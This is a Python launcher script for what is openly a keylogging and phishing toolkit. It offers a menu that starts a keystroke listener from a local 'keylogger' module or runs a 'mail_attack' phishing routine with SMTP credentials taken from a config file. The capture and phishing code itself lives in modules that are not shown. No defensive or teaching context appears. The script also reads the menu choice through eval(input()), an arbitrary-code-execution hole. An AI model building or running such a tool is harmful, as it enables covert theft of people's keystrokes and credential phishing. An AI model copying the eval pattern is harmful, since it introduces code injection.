from pynput.keyboard import Key, Listener
import getpass
from config import Config as config
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
import phisher
import keylogger



# Display commandline menu
def menu():
    MENU = '\
    Choose an operation \n\
        1: Keylog \n\
        2: Phishing\n\
        3: Exit\n \
        '
    print(MENU)




if __name__ == '__main__':

    while True:
        menu()
        choice = eval(input("Choose operation: "))
        if choice == 1:
            print('Listening for keystrokes... \nPress ESC to go back to menu')
            keylogger.keylogger()
        elif choice == 2:
            phisher.mail_attack(config.MAIL_USERNAME,config.MAIL_PASSWORD)
        elif choice == 3:
            exit()
        else:
            print('Choice unknown')
            exit()
